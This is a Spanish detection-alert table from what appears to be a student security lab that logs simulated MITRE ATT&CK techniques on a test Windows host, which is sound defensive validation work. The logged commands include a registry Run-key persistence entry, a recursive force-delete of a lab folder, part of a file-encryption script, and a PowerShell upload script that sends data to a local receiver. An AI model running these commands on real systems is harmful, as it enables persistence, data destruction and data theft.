Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "SetValue", "UtcTime": "2026-06-24 12:51:33.974", "ProcessGuid": "6BC49A7D-D2D5-6A3B-D768-000000009801", "ProcessId": 10524, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "Details": "C:\\Windows\\System32\\calc.exe", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	13	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P2	TEC-005	T1569.002		Forensic_EVENT_System_7045_ServiceCreation	LT29.ait.us.es	System	{ "ServiceName": "TFM TEC005 Test Service", "ImagePath": "C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt", "ServiceType": "servicio de modo usuario", "StartType": "inicio por solicitud", "AccountName": "LocalSystem" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_System_7045_ServiceCreation-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.524Z	P1	TEC-007	T1486	TEC-007 critical encryption behavior	P1_EVENT_PowerShell4104_Basic	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$WorkDir = "", [string]$ListFile = "", [string]$PasswordFile = "", [int]$MaxFiles = 25 ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($WorkDir)) { $WorkDir = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($ListFile)) { $ListFile = Join-Path $PSScriptRoot "lista_archivos.csv" } if ([string]::IsNullOrWhiteSpace($PasswordFile)) { $PasswordFile = Join-Path $PSScriptRoot "password.txt" } if (-not (Test-Path -LiteralPath $WorkDir)) { throw "WorkDir does not exist: $WorkDir" } if (-not (Test-Path -LiteralPath $ListFile)) { throw "ListFile does not exist: $ListFile" } if (-not (Test-Path -LiteralPath $PasswordFile)) { Set-Content -Litera...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_PowerShell4104_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:42.608Z	P1	TEC-008	T1485	TEC-008 critical destructive deletion behavior	P1_EVENT_PowerShell4104_Basic	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_PowerShell4104_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P1	TEC-005	T1569.002	TEC-005 high-confidence service execution	P1_EVENT_System7045_ServiceCreation	LT29.ait.us.es	System	Se instaló un servicio en el sistema. Nombre del servicio: TFM TEC005 Test Service Nombre del archivo del servicio: C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt Tipo de servicio: servicio de modo usuario Tipo de inicio de servicio: inicio por solicitud Cuenta de servicio: LocalSystem	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_System7045_ServiceCreation-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.989Z	P3	TEC-001	T1059.001	TEC-001 PowerShell suspicious execution	TEC001_PowerShell_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC001_PowerShell_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.594Z	P3	TEC-001	T1059.001	TEC-001 PowerShell suspicious execution	TEC001_PowerShell_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	function Test-Tec009Evidence { param( [AllowEmptyString()][string]$Command = "", [AllowEmptyString()][string]$ScriptPath = "", [AllowEmptyString()][string]$ReceiverUrl = "", [AllowEmptyString()][string]$HttpStatus = "", [AllowEmptyString()][string]$UploadSucceeded = "", [AllowEmptyString()][string]$ZipFile = "", [AllowEmptyString()][string]$CopyFile = "", [AllowEmptyString()][string]$LocalSHA256 = "", [AllowEmptyString()][string]$SummaryFile = "", $SummaryObject = $null, $PowerShell4104 = $null ) $checks = @() $checks += New-EvidenceCheckRow -CheckName "powershell.exe -File invocation" -Status $(if ($Command -match '(?i)powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-File') { "OK" } else { "FAIL" }) -Expected "powershell.exe -NoProfile -ExecutionPolicy Bypass -File" -Found $Command -Evidence $Command -Comment "TEC-009 must run in an explicit PowerShell child process." $checks...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC001_PowerShell_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
